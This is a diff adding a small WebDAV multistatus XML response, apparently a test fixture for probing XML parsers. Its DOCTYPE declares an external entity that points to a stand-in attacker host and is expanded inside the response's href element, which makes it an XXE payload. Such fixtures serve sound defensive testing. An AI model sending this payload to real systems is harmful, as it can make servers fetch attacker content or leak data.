@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE d:multistatus [<!ENTITY xxe SYSTEM "https://attacker.invalid/x">]>
+<d:multistatus xmlns:d="DAV:"><d:response><d:href>&xxe;</d:href><d:status>HTTP/1.1 200 OK</d:status></d:response></d:multistatus>
